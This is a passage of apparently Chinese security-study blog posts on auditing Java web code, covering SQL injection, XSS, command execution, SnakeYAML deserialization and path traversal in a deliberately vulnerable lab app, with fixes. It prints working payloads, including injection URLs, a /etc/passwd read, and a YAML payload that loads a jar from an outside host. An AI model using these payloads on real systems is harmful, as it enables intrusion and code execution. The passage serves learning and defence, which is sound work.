2秒\n\n语句错误，返回500，可以布尔，也可以时间盲注。习惯时间了：\n\n成功延时2秒\n其他注入点一样\n存储型xss：一般是直接用fortify扫描，或是找update和insert语句。其中update语句大多会在页面显示。所以直接找update语句。还要注意是否存在全局过滤。\n这个项目的配置文件和jsp里都没有写过滤设置，全局搜索filter也只有一个管理员账户验证的filter。\n所以，直接找update语句。在AccountController.java里面有一个更新管理员信息的方法：\n&#x2F;&#x2F;更新管理员信息\n @Transactional(propagation &#x3D; Propagation.REQUIRED, rollbackFor &#x3D; Exception.class)\n @ResponseBody\n @RequestMapping(value &#x3D; &quot;admin&#x2F;account&#x2F;&#123;admin_id&#125;&quot;, method &#x3D; RequestMethod.PUT, produces &#x3D; &quot;application&#x2F;json;charset&#x3D;UTF-8&quot;)\n public String updateAdmin(HttpSession session, @RequestParam String admin_nickname&#x2F;*管理员昵称*&#x2F;,\n                           @RequestParam(required &#x3D; false) String admin_password&#x2F;*管理员当前密码*&#x2F;,\n                           @RequestParam(required &#x3D; false) String admin_newPassword&#x2F;*管理员新密码*&#x2F;,\n                           @RequestParam(required &#x3D; false) String admin_profile_picture_src&#x2F;*管理员头像路径*&#x2F;,\n                           @PathVariable(&quot;admin_id&quot;) String admin_id&#x2F;*管理员编号*&#x2F;) &#123;\n     logger.info(&quot;获取管理员信息&quot;);\n     Object adminId &#x3D; checkAdmin(session);\n     if (adminId &#x3D;&#x3D; null) &#123;\n         return &quot;admin&#x2F;include&#x2F;loginMessage&quot;;\n     &#125;\n     JSONObject jsonObject &#x3D; new JSONObject();\n     Admin putAdmin &#x3D; new Admin();\n     putAdmin.setAdmin_id(Integer.valueOf(admin_id));\n     putAdmin.setAdmin_nickname(admin_nickname);\n\n     if (admin_password !&#x3D; null &amp;&amp; !&quot;&quot;.equals(admin_password) &amp;&amp; admin_newPassword !&#x3D; null &amp;&amp; !&quot;&quot;.equals(admin_newPassword)) &#123;\n         logger.info(&quot;获取需要修改的管理员信息&quot;);\n         Admin admin &#x3D; adminService.get(null, Integer.valueOf(adminId.toString()));\n         if (adminService.login(admin.getAdmin_name(), admin_password) !&#x3D; null) &#123;\n             logger.info(&quot;原密码正确&quot;);\n             putAdmin.setAdmin_password(admin_newPassword);\n         &#125; else &#123;\n             logger.info(&quot;原密码错误，返回错误信息&quot;);\n             jsonObject.put(&quot;success&quot;, false);\n             jsonObject.put(&quot;message&quot;, &quot;原密码输入有误！&quot;);\n             return jsonObject.toJSONString();\n         &#125;\n     &#125;\n     if (admin_profile_picture_src !&#x3D; null &amp;&amp; !&quot;&quot;.equals(admin_profile_picture_src)) &#123;\n         logger.info(&quot;管理员头像路径为&#123;&#125;&quot;, admin_profile_picture_src);\n         putAdmin.setAdmin_profile_picture_src(admin_profile_picture_src.substring(admin_profile_picture_src.lastIndexOf(&quot;&#x2F;&quot;) + 1));\n     &#125;\n\n     logger.info(&quot;更新管理员信息，管理员ID值为：&#123;&#125;&quot;, admin_id);\n     Boolean yn &#x3D; adminService.update(putAdmin);\n     if (yn) &#123;\n         logger.info(&quot;更新成功！&quot;);\n         jsonObject.put(&quot;success&quot;, true);\n         session.removeAttribute(&quot;adminId&quot;);\n         session.invalidate();\n         logger.info(&quot;登录信息已清除&quot;);\n     &#125; else &#123;\n         jsonObject.put(&quot;success&quot;, false);\n         logger.warn(&quot;更新失败！事务回滚&quot;);\n         throw new RuntimeException();\n     &#125;\n\n     return jsonObject.toJSONString();\n &#125;\n\n一直往上面找，直到AdminMapper.xml，发现了调用的语句。使用了预编译：\n&lt;update id&#x3D;&quot;updateOne&quot; parameterType&#x3D;&quot;admin&quot;&gt;\n     UPDATE admin\n     &lt;set&gt;\n         &lt;if test&#x3D;&quot;admin.admin_profile_picture_src !&#x3D; null&quot;&gt;admin_profile_picture_src &#x3D; #&#123;admin.admin_profile_picture_src&#125;,&lt;&#x2F;if&gt;\n         &lt;if test&#x3D;&quot;admin.admin_nickname !&#x3D; null&quot;&gt;admin_nickname &#x3D; #&#123;admin.admin_nickname&#125;,&lt;&#x2F;if&gt;\n         &lt;if test&#x3D;&quot;admin.admin_password !&#x3D; null&quot;&gt;admin_password &#x3D; #&#123;admin.admin_password&#125;&lt;&#x2F;if&gt;\n     &lt;&#x2F;set&gt;\n     &lt;where&gt;\n         admin_id &#x3D; #&#123;admin.admin_id&#125;\n     &lt;&#x2F;where&gt;\n &lt;&#x2F;update&gt;\n\n但是这时xss。。。。直接找该路由，插入xsspayload：\n后台查看发现，页面中插入的框框只有一个管理员昵称，正好管理员昵称也在这个方法里面，直接插如payload：\n\n插入好点保存，会直接退出登录，当再次登陆该管理员账号就会弹窗：\n\n吐槽：跟php一样的审计，甚至感觉这个项目比php的更简单。可能是因为逻辑和结构更加严谨吧。还有就是没有做什么过滤。\n前几天看一个thinkphp的cms代码，使用的是thinkphp5.1.41。直接就懵了，不知道怎么办。后面看了很多文章，发现，这个版本的tp有反序列化链。虽然项目没有unserialize，但是可以使用phar反序列化，直接就命令执行了。\n果然，学习理论只是第一步。只有将理论和实际结合，之后才可能将理论融汇贯通。真正的变成自己的技能。不然，再怎么学，一段时间不用可能就忘了。如果忽然实战审计，也会懵逼。难过那么多CTF大佬，最后去挖洞也能挖的很多。各种利用，各种绕过，各种特性已经被他们玩花了。\n安全安全，有了实际的存在，才有了保护安全的必要。所以，安全可以说是任何存在事物的一个属性。最后解决安全问题的还得是产生安全问题的。\n要想往上走，还得学开发。一种是自己当程序员写安全的代码，但是这个谁能保证自己的代码就一定安全呢？而且写代码的有那么多？就是自己写的没问题，同一个项目的同事写的就不一定了。另一种就是安全开发，替开发解决安全问题。开发随便写，只要使用安全工具能解决外来攻击者的一切攻击。对比起来，还是安全开发的路更好，也更实际。专业的问题就交给专业的人来解决。\n","slug":"Java代码审计练习项目Mini-Tmall","date":"2022-12-10T07:38:39.000Z","categories_index":"代码审计","tags_index":"Java","author_index":"Longw"},{"id":"241d6a7bc9b104c51a615919491c3ad9","title":"Java代码审计学习","content":"\n\n环境搭建：视频教程地址：https://www.bilibili.com/video/BV11t4y1n7KU/?share_source=copy_web&amp;vd_source=8ca6ac59b747f3cadc0c59cff919b9e5\n文档地址：https://www.freebuf.com/articles/web/338008.html\nJavasec地址：https://javasec.org/\nIDEA导入项目，遇到激活服务器重新激活，在日常问题处理里面有记录解决方法\n修改了maven的setting位置改成了d盘\n自动加载相关类库\n直接运行，访问192.168.0.107:8080即可看到登录页面\nadmin  admin123\nSQL注入：JDBC：漏洞代码：这种链接方式只有老版本的cms才会使用了\nhttp://192.168.0.107:8080/sqli/jdbc/vuln?username=joychou\n漏洞代码：\n&#x2F;**\n     * Vuln Code.\n     * http:&#x2F;&#x2F;localhost:8080&#x2F;sqli&#x2F;jdbc&#x2F;vuln?username&#x3D;joychou\n     *\n     * @param username username\n     *&#x2F;\n    &#x2F;&#x2F;@RequestMapping(&quot;&#x2F;jdbc&#x2F;vuln&quot;)\n    @GetMapping(&quot;&#x2F;jdbc&#x2F;vuln&quot;)\n    &#x2F;&#x2F;public String jdbc_sqli_vul(@RequestParam(&quot;username&quot;) String username) &#123;\n        public String jdbc_sqli_vul( String username) &#123;\n\n        StringBuilder result &#x3D; new StringBuilder();\n\n        try &#123;\n            Class.forName(driver);\n            Connection con &#x3D; DriverManager.getConnection(url, user, password);\n\n            if (!con.isClosed())\n                System.out.println(&quot;Connect to database successfully.&quot;);\n\n            &#x2F;&#x2F; sqli vuln code\n            Statement statement &#x3D; con.createStatement();\n            String sql &#x3D; &quot;select * from users where username &#x3D; &#39;&quot; + username + &quot;&#39;&quot;;\n            logger.info(sql);\n            ResultSet rs &#x3D; statement.executeQuery(sql);\n\n            while (rs.next()) &#123;\n                String res_name &#x3D; rs.getString(&quot;username&quot;);\n                String res_pwd &#x3D; rs.getString(&quot;password&quot;);\n                String info &#x3D; String.format(&quot;%s: %s\\n&quot;, res_name, res_pwd);\n                result.append(info);\n                logger.info(info);\n            &#125;\n            rs.close();\n            con.close();\n\n\n        &#125; catch (ClassNotFoundException e) &#123;\n            logger.error(&quot;Sorry,can&#96;t find the Driver!&quot;);\n        &#125; catch (SQLException e) &#123;\n            logger.error(e.toString());\n        &#125;\n        return result.toString();\n    &#125;\n\nsql语句直接拼接，只需要闭合前面的单引号就能注入，但是没有输出错误信息。所以直接使用时间盲注payload，其实也可以使用布尔盲注。习惯时间盲注了。\n[http://localhost:8080/sqli/jdbc/vuln?username=joychou%27and%20if(length(database())%3E1,sleep(3),0)%23](http://localhost:8080/sqli/jdbc/vuln?username=joychou&#39;and if(length(database())&gt;1,sleep(3),0)%23)\n页面成功延时3秒钟\n在sql语句下断点，调试发现直接将语句拼接导致注入\n\n修复代码：Java的sql注入防御一般使用预编译\n&#x2F;**\n   * Security Code.\n   * http:&#x2F;&#x2F;localhost:8080&#x2F;sqli&#x2F;jdbc&#x2F;sec?username&#x3D;joychou\n   *\n   * @param username username\n   *&#x2F;\n\n  &#x2F;&#x2F;    http:&#x2F;&#x2F;localhost:8080&#x2F;sqli&#x2F;jdbc&#x2F;sec?username&#x3D;xx\n  &#x2F;&#x2F;http:&#x2F;&#x2F;localhost:8080&#x2F;controller&#x2F;&#x2F;sqli&#x2F;jdbc&#x2F;sec?username&#x3D;xx\n  @RequestMapping(&quot;&#x2F;jdbc&#x2F;sec&quot;)\n  public String jdbc_sqli_sec(@RequestParam(&quot;username&quot;) String username) &#123;\n\n      StringBuilder result &#x3D; new StringBuilder();\n      try &#123;\n          Class.forName(driver);\n          Connection con &#x3D; DriverManager.getConnection(url, user, password);\n\n          if (!con.isClosed())\n              System.out.println(&quot;Connecting to Database successfully.&quot;);\n\n          &#x2F;&#x2F; fix code\n          String sql &#x3D; &quot;select * from users where username &#x3D; ?&quot;;\n          PreparedStatement st &#x3D; con.prepareStatement(sql);\n          st.setString(1, username);\n\n          logger.info(st.toString());  &#x2F;&#x2F; sql after prepare statement\n          ResultSet rs &#x3D; st.executeQuery();\n\n          while (rs.next()) &#123;\n              String res_name &#x3D; rs.getString(&quot;username&quot;);\n              String res_pwd &#x3D; rs.getString(&quot;password&quot;);\n              String info &#x3D; String.format(&quot;%s: %s\\n&quot;, res_name, res_pwd);\n              result.append(info);\n              logger.info(info);\n          &#125;\n\n          rs.close();\n          con.close();\n\n      &#125; catch (ClassNotFoundException e) &#123;\n          logger.error(&quot;Sorry, can&#96;t find the Driver!&quot;);\n          e.printStackTrace();\n      &#125; catch (SQLException e) &#123;\n          logger.error(e.toString());\n      &#125;\n      return result.toString();\n  &#125;\n\n\n就是使用？占位符，在使用预编译，Java预编译会将占位符的参数字符串的内容进行转义\n再次使用刚刚的延时注入payload：[http://localhost:8080/sqli/jdbc/sec?username=joychou%27and%20if(length(database())%3E1,sleep(3),0)%23](http://localhost:8080/sqli/jdbc/sec?username=joychou&#39;and if(length(database())&gt;1,sleep(3),0)%23)\n发现页面很快就刷新过来，调试一下，看看Java预编译是如何处理语句的\n\n开源看到我输入的单引号被转义了，这样语句就不能注入了\nlike预编译问题：Java预编译是很好的解决注入的方法，但是不正确的使用预编译也会造成注入。而且有的sql关键字后面使用预编译需要注意，比如like：\n正常的like注入就不讲了，直接看预编译的like注入\n错误写法：String sql &#x3D; &quot;select * from users where username like &#39;% ? %&#39;&quot;;\n            PreparedStatement st &#x3D; con.prepareStatement(sql);\n            st.setString(1, username);\n\n这段预编译语句会直接报错，为什么？因为这个?被包裹在了单引号里面，Java就无法判断占位符。那如果按照下面这样写呢？\n正确写法1：String sql &#x3D; &quot;select * from users where username like &#39;%&#39; ? &#39;%&#39;&quot;;\n            PreparedStatement st &#x3D; con.prepareStatement(sql);\n            st.setString(1, username);\n\n这个时候idea没有报错，按照道理这个语句在执行sql的时候会报错，但是我测试发现可以正常执行。调试发现虽然使用了两个单引号包裹% ，但是在语句中只会有一个单引号\n\n并且username正确时，能够得到正确结果。所以，这是一种正确的写法。。。。\n在网上搜索只发现下面这种正确写法：\n写法2：String sql &#x3D; &quot;select * from users where username like ?&quot;;\n            PreparedStatement st &#x3D; con.prepareStatement(sql);\n&#x2F;&#x2F;            st.setString(1, username);\n            st.setString(1, &quot;%&quot;+username+&quot;%&quot;);\n\n这种写法就不用多说了\norder by：还有order by这种，这种是直接不能使用预编译的。在order by的后面要跟字段名，预编译处理时会直接将字段名用单引号包裹。\n所以一般这个地方比较容易出现sql注入\n实列的话，看这个链接：https://blog.csdn.net/lin___/article/details/51731019\nMybatis：接下来就是常用的框架了\n框架识别：首先是如何判断源码中使用的是Mybatis，直接查看pom.xml。里面会列举出这套源码使用的各种组件和版本\n&lt;!-- mybatis --&gt;\n&lt;dependency&gt;\n&lt;groupId&gt;org.mybatis.spring.boot&lt;&#x2F;groupId&gt;\n&lt;artifactId&gt;mybatis-spring-boot-starter&lt;&#x2F;artifactId&gt;\n&lt;version&gt;1.3.2&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n\n如果使用了Mybatis，就会写在pom.xml里面。\n映射方法：代码中有两种映射方法，一种是通过sql语句标签映射。\n @GetMapping(&quot;&#x2F;mybatis&#x2F;vuln01&quot;)\n    public List&lt;User&gt; mybatisVuln01(@RequestParam(&quot;username&quot;) String username) &#123;\n        return userMapper.findByUserNameVuln01(username);\n    &#125;\n\n\n@Select(&quot;select * from users where username &#x3D; &#39;$&#123;username&#125;&#39;&quot;)\n    List&lt;User&gt; findByUserNameVuln01(@Param(&quot;username&quot;) String username);\n\n另一种不使用标签，但是会将sql语句放在一个xml文件里面。这个文件一般放在resources/mapper文件夹里面：\n@GetMapping(&quot;&#x2F;mybatis&#x2F;vuln02&quot;)\n    public List&lt;User&gt; mybatisVuln02(@RequestParam(&quot;username&quot;) String username) &#123;\n        return userMapper.findByUserNameVuln02(username);\n    &#125;\n\n&lt;!--&lt;select id&#x3D;&quot;findByUserName&quot; resultMap&#x3D;&quot;User&quot;&gt;--&gt;\n &lt;!--select * from users where username &#x3D; #&#123;username&#125;--&gt;\n&lt;!--&lt;&#x2F;select&gt;--&gt;\n\n&lt;select id&#x3D;&quot;findByUserNameVuln02&quot; parameterType&#x3D;&quot;String&quot; resultMap&#x3D;&quot;User&quot;&gt;\n\n    select * from users where username like &#39;%$&#123;_parameter&#125;%&#39;\n&lt;&#x2F;select&gt;\n\n&lt;select id&#x3D;&quot;findByUserNameVsec02&quot; parameterType&#x3D;&quot;String&quot; resultMap&#x3D;&quot;User&quot;&gt;\n    select * from users where username like concat(&#39;%&#39;,#&#123;_parameter&#125;, &#39;%&#39;)\n&lt;&#x2F;select&gt;\n\n这个里面的_parameter是一个万能替换参数，无论前面的代码中给这个参数起个什么名字，都能使用_parameter参数接收。通过id识别使用的是哪条语句。\n拼接方法：Mybatis中两种拼接sql语句的方法：\n\n${xxx}   属于直接拼接，类似于jdbc\n#{xxxxx}  进行预处理后拼接\n\n${}：一般的sql漏洞也是出现在第一种拼接方式中，所以审计的时候可以全文查找${\n前面两种映射的拼接方式都是直接拼接，就可能存在漏洞\n看一下第一种拼接的语句最后是什么样子\n好家伙调式鬼才，太麻烦了，直接看看执行的sql语句是什么吧\n访问：[http://localhost:8080/sqli/mybatis/vuln01?username=joychou%27%20or%20%271%27=%271](http://localhost:8080/sqli/mybatis/vuln01?username=joychou&#39; or ‘1’=’1)\n\n可以看到，直接拼接造成语句变成全匹配，直接返回所有结果\n这种的修复就是直接将${} 替换为#{}\nlike修复：和前面一样，遇到like的时候需要注意。直接拼接不会出现问题，但是当使用#{}进行修复需要注意\n可以使用concat进行字符串拼接\nMysql：\n&lt;select id&#x3D;&quot;findByUserNameVsec02&quot; parameterType&#x3D;&quot;String&quot; resultMap&#x3D;&quot;User&quot;&gt;\n    select * from users where username like concat(&#39;%&#39;,#&#123;_parameter&#125;, &#39;%&#39;)\n&lt;&#x2F;select&gt;\n\n当然基于前面的发现，可以直接这样写\n&lt;select id&#x3D;&quot;findByUserNameVsec02&quot; parameterType&#x3D;&quot;String&quot; resultMap&#x3D;&quot;User&quot;&gt;\n       select * from users where username like &#39;%&#39;,#&#123;_parameter&#125;, &#39;%&#39;\n   &lt;&#x2F;select&gt;\n\n访问：[http://localhost:8080/sqli/mybatis/vsec02?username=joychou%27%20or%20%271%27=%271%27%20%23](http://localhost:8080/sqli/mybatis/vsec02?username=joychou&#39; or ‘1’=’1’ %23)\n可以看到返回结果为空，同时查看执行的sql语句为：\nselect * from users where username like concat(&#39;%&#39;,&#39;joychou\\&#39; or \\&#39;1\\&#39;&#x3D;\\&#39;1\\&#39; #&#39;, &#39;%&#39;)\n\n已经转义完成。\nOracle：\nSELECT * FROM user WHERE name like CONCAT(&#39;%&#39;,#&#123;name&#125;,&#39;%&#39;) \n或 \nSELECT * FROM user WHERE name like &#39;%&#39;||#&#123;name&#125;||&#39;%&#39;\n\nSqlserver：\nSELECT * FROM user WHERE name like &#39;%&#39;+#&#123;name&#125;+&#39;%&#39; \n\nDB2：\nSELECT * FROM user WHERE name like &#39;%&#39;+#&#123;name&#125;+&#39;%&#39; \n或 \nSELECT * FROM user WHERE name like &#39;%&#39;||#&#123;name&#125;||&#39;%&#39;\n\norder by修复：payload：[http://localhost:8080/sqli/mybatis/orderby/vuln03?sort=1%20and%20updatexml(1,concat(0x7e,(select%20version()),0x7e),1)](http://localhost:8080/sqli/mybatis/orderby/vuln03?sort=1 and updatexml(1,concat(0x7e,(select version()),0x7e),1))\n直接在whitelabel error page页面爆出数据库版本。\n直接拼接也是一样的${}，看如何修复\n修复就和前面jdbc一样，只能添加过滤，要不然就直接将参数写死。\n过滤方法：\nprivate static final Pattern FILTER_PATTERN &#x3D; Pattern.compile(&quot;^[a-zA-Z0-9_&#x2F;\\\\.-]+$&quot;);\n\n    &#x2F;**\n     * 过滤mybatis中order by不能用#的情况。\n     * 严格限制用户输入只能包含&lt;code&gt;a-zA-Z0-9_-.&lt;&#x2F;code&gt;字符。\n     *\n     * @param sql sql\n     * @return 安全sql，否则返回null\n     *&#x2F;\n    public static String sqlFilter(String sql) &#123;\n        if (!FILTER_PATTERN.matcher(sql).matches()) &#123;\n            return null;\n        &#125;\n        return sql;\n    &#125;\n\nHibernate：是和Mybatis类似的框架\n这个视频作者没有详解，来个学习链接：https://www.cnblogs.com/hhua-best/p/8051860.html\n主要是这个框架配置比较麻烦\n视频作者的原文：\nhibernate即我们经常使用的orm的一种实现，如果使用已封装好的方法，那么默认是使用预编译的。需要注意的有这么几种情况：\n\n对于一些复杂的sql语句，需要开发手写sql，此时要严格过滤用户输入。\n上面提到的预编译不生效的几种场景。\n\nhibernate的审计和jdbc类似，查找+，like，order by\n吐槽：thinkphp5.1的cms审的太费劲，喜欢全文看，那得看好久。只能功能点测试+功能点代码审计+关键字搜索\n为了不耽误时间，thinkphp框架的先放一放\n先来Java代码审计的学习了\n看视频发现教程作者也是不懂开发的，但是能总结成这样真是不错了。入门完全没问题。。。。\n这个教程适合不是太懂Java的，要想深入学习，有一些大佬也出了一些教程：\n很推荐：\nJava安全学习：https://javasec.org/\nJava反序列化入门：代码审计星球的系列文章 Java安全漫谈\nJava反序列化利用链调式详情：B站白日梦组长\n学这么久了，该看的也看了，得总结了。后面会把常见的漏洞及利用方式总结，方便自己忘记的时候查找。形成框架，方便复习。后面学到新姿势，就是在框架上添砖加瓦了。\n归类总结才是正途。。。。。。。。\nRCE：在Java中，很多反序列化导致执行命令，本地命令执行感觉应该不是很多。并且Java开发常用的命令执行也就那么几个，其他深层次调用都需要通过反射和反序列化配合。\n所以，在Java中审计命令执行就查找相关的几个关键字就行了。\nRuntime.exec：最常用的就是这个Runtime.exec了，包括各种里用反序列化执行命令也是使用这个方法\n@GetMapping(&quot;&#x2F;runtime&#x2F;exec&quot;)\n    public String CommandExec(String cmd) &#123;\n        Runtime run &#x3D; Runtime.getRuntime();\n        StringBuilder sb &#x3D; new StringBuilder();\n\n        try &#123;\n            Process p &#x3D; run.exec(cmd);\n            BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream());\n            BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));\n            String tmpStr;\n\n            while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123;\n                sb.append(tmpStr);\n            &#125;\n\n            if (p.waitFor() !&#x3D; 0) &#123;\n                if (p.exitValue() &#x3D;&#x3D; 1)\n                    return &quot;Command exec failed!!&quot;;\n            &#125;\n\n            inBr.close();\n            in.close();\n        &#125; catch (Exception e) &#123;\n            return e.toString();\n        &#125;\n        return sb.toString();\n    &#125;\n\n\n接收cmd参数，直接放到exec方法去执行，没有任何过滤\n访问：http://localhost:8080/rce/runtime/exec?cmd=whoami\n直接执行命令\nProcessBuilder：Runtime.exec是直接执行命令和在命令行使用相同，Processbuilder传入的参数是一个列表，第一个参数是可执行命令的程序，后面的参数是该程序的参数。\n@GetMapping(&quot;&#x2F;ProcessBuilder&quot;)\n   public String processBuilder(String cmd,String cmd1) &#123;\n\n       StringBuilder sb &#x3D; new StringBuilder();\n\n       try &#123;\n          &#x2F;&#x2F; String[] arrCmd &#x3D; &#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmd&#125;;  &#x2F;&#x2F;linux\n           String[] arrCmd &#x3D; &#123;cmd,cmd1&#125;;                 &#x2F;&#x2F;windows,windos下无需指定\n           ProcessBuilder processBuilder &#x3D; new ProcessBuilder(arrCmd);\n           Process p &#x3D; processBuilder.start();\n           BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream());\n           BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));\n           String tmpStr;\n\n           while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123;\n               sb.append(tmpStr);\n           &#125;\n       &#125; catch (Exception e) &#123;\n           return e.toString();\n       &#125;\n\n       return sb.toString();\n   &#125;\n\n为了体现区别，就直接接收两个传参。比如执行ping baidu.com，只需要访问：\nhttp://localhost:8080/rce/ProcessBuilder?cmd=ping&amp;cmd1=baidu.com\n若是需要执行whoami，只需将第二个参数设置为空，但访问时必须携带，否则会爆出空指针异常\nhttp://localhost:8080/rce/ProcessBuilder?cmd=whoami&amp;cmd1=\n那要是只有一个参数该怎么办呢？开始以为只有一个参数，是不是就可以传入一个列表，或者按照php数组参数。但是测试发现都不可以，毕竟Java是强类型语言，定义的cmd参数是String类型，传入数组或列表肯定会报错的。\nRuntime.exec也是使用ProcessBuilder执行命令。但是肯定是处理了传入的字符串，按照空格变成数组。所以使用ProcessBuilder执行ping之类的命令可能需要一点小技巧。。。\n还有类似的漏洞代码\n@GetMapping(&quot;&#x2F;codeinject&quot;)\n   public String codeInject(String filepath) throws IOException &#123;\n\n       &#x2F;&#x2F;String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;\n       String[] cmdList &#x3D; new String[]&#123;&quot;cmd.exe&quot;, &quot;-c&quot;, &quot;dir &quot; + filepath&#125;;\n       ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);\n       builder.redirectErrorStream(true);\n       Process process &#x3D; builder.start();\n       return WebUtils.convertStreamToString(process.getInputStream());\n   &#125;\n\n可控某一部分参数，使用命令拼接的方法执行命令\n访问：[http://localhost:8080/codeinject?filepath=/tmp;cat%20/etc/passwd](http://localhost:8080/codeinject?filepath=/tmp;cat /etc/passwd)\n查看/etc/passwd文件\nScriptEngine：使用脚本引擎执行脚本代码，引擎脚本为js，通过获取远程js文件，并执行js文件中的js代码。要是该js文件可控，那么就可以利用它执行恶意js脚本。\n@GetMapping(&quot;&#x2F;jscmd&quot;)\n    public void jsEngine(String jsurl) throws Exception&#123;\n        &#x2F;&#x2F; js nashorn javascript ecmascript\n        ScriptEngine engine &#x3D; new ScriptEngineManager().getEngineByName(&quot;js&quot;);\n        Bindings bindings &#x3D; engine.getBindings(ScriptContext.ENGINE_SCOPE);&#x2F;&#x2F;启动javascript引擎\n        String cmd &#x3D; String.format(&quot;load(\\&quot;%s\\&quot;)&quot;, jsurl);\n        engine.eval(cmd, bindings);\n    &#125;\n\nrce.js\nvar a &#x3D; mainOutput(); \nfunction mainOutput() &#123; \n  var x&#x3D;java.lang.Runtime.getRuntime().exec(&quot;calc&quot;);\n&#125;\n\n在服务器上打开python http.server  ，之后远程访问该js文件\nhttp://localhost:8080/rce/jscmd?jsurl=http://xxxx/rce.js\n即可执行命令，弹出计算器，linux修改命令就行\nsnakeyaml：利用snakeyaml存在反序列化漏洞，就是可以通过其远程加载恶意jar文件，达到命令执行的效果。\nsnakeyaml   maven依赖\n&lt;dependency&gt;\n  &lt;groupId&gt;org.yaml&lt;&#x2F;groupId&gt;\n  &lt;artifactId&gt;snakeyaml&lt;&#x2F;artifactId&gt;\n  &lt;version&gt;1.27&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n\n这个恶意类必须实现了javax.script.ScriptEngineFactory接口\npayload：https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java\n先将该java文件编译，在生成jar文件\njavac src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java\n\njar -cvf yaml-payload.jar -C src&#x2F; .\n\n之后和前面一样，放到服务器上，开启python http服务。\n通过url访问\n漏洞代码：\n@GetMapping(&quot;&#x2F;vuln&#x2F;yarm&quot;)\n    public void yarm(String content) &#123;\n        Yaml y &#x3D; new Yaml();\n        y.load(content);\n    &#125;\n\npayload：\n!!javax.script.ScriptEngineManager [\n  !!java.net.URLClassLoader [[\n    !!java.net.URL [&quot;http:&#x2F;&#x2F;artsploit.com&#x2F;yaml-payload.jar&quot;]\n  ]]\n]\n\n访问：[http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://xxxx/yaml-payload.jar%22\\]]]]](http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“http://118.178.180.212/yaml-payload.jar&quot;]]]])\n即可弹出记事本，据说基本碰不到\ngroovy：groovy是类似python的语言，能够很好的结合Java虚拟机。\n在Java代码中直接创建一个GroovyShell对象，使用evaluate方法执行代码\n@GetMapping(&quot;groovy&quot;)\n    public void groovyshell(String content) &#123;\n        GroovyShell groovyShell &#x3D; new GroovyShell();\n        groovyShell.evaluate(content);\n    &#125;\n\n直接访问：http://localhost:8080/rce/groovy?content=%22calc%22.execute()\n就可以弹出计算器，与Runtime的区别就是它有自己的语法格式，需要学习一下\n学习链接：https://www.w3cschool.cn/groovy/groovy_basic_syntax.html\n修复：命令执行的修复，这个作者提出的是通过正则，和前面sql注入一样的修复。这怎么能行呢？该执行的还是执行。\n像这种命令执行的，还是用白名单好一点，限制执行的命令。同时使用过滤，防止命令拼接。\n其中snakeyaml的修复很简单，就是使用SafeConstructor类，限制而已类的加载\n@GetMapping(&quot;&#x2F;sec&#x2F;yarm&quot;)\npublic void secYarm(String content) &#123;\n    Yaml y &#x3D; new Yaml(new SafeConstructor());\n    y.load(content);\n&#125;\n\n用payload访问修复的，直接报错。\n文件访问类漏洞：任意文件读取@GetMapping(&quot;&#x2F;path_traversal&#x2F;vul&quot;)\n    public String getImage(String filepath) throws IOException &#123;\n        return getImgBase64(filepath);\n    &#125;\n\ngetImgBase64方法\nprivate String getImgBase64(String imgFile) throws IOException &#123;\n\n        logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;));\n        logger.info(&quot;File path: &quot; + imgFile);\n\n        File f &#x3D; new File(imgFile);\n        if (f.exists() &amp;&amp; !f.isDirectory()) &#123;\n            byte[] data &#x3D; Files.readAllBytes(Paths.get(imgFile));\n            return new String(Base64.encodeBase64(data));\n        &#125; else &#123;\n            return &quot;File doesn&#39;t exist or is not a file.&quot;;\n        &#125;\n    &#125;\n\n如果文件目录存在，就读取文件内容并且将其base64编码显示\n访问：http://localhost:8080/path_traversal/vul?filepath=ceshi.txt\n直接获取项目目录ceshi.txt内容，解码就能看到具体内容\n修复：视频作者的修复就是直接添加一个方法，看路径中是否存在.. 和 / ，存在就返回null\npublic static String pathFilter(String filepath) &#123;\n       String temp &#x3D; filepath;\n\n       &#x2F;&#x2F; use while to sovle multi urlencode\n       while (temp.indexOf(&#39;%&#39;) !&#x3D; -1) &#123;\n           try &#123;\n               temp &#x3D; URLDecoder.decode(temp, &quot;utf-8&quot;);\n           &#125; catch (UnsupportedEncodingException e) &#123;\n               logger.info(&quot;Unsupported encoding exception: &quot; + filepath);\n               return null;\n           &#125; catch (Exception e) &#123;\n               logger.info(e.toString());\n               return null;\n           &#125;\n       &#125;\n\n       if (temp.contains(&quot;..&quot;) || temp.charAt(0) &#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;\n           return null;\n       &#125;\n\n       return filepath;\n   &#125;\n\n虽然不能任意读取，但是同级目录还是能读取的\n关于这个漏洞，还是看javasec.org的，讲的比较深\nhttps://javasec.org/java-vuls/FileSystem.html#%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E7%B1%BB%E6%BC%8F%E6%B4%9E\nJavasec.org中将文件读取漏洞分为同级目录任意文件读取和跨目录任意文件读取，看，这个视频作者的修复不完全导致还是存在文件读取漏洞。\n再加个白名单判断应该能处理好这个漏洞。\nNIO任意文件读取：https://javasec.org/java-vuls/FileSystem.html#7-io%E5%92%8Cnio2%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%94%AF%E6%8C%81\n都是文件读取类，就放在一起了。当然，sec单独列出可能代表着NIO不仅仅能读取文件，也能进行其他文件类操作。\n&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%@ page 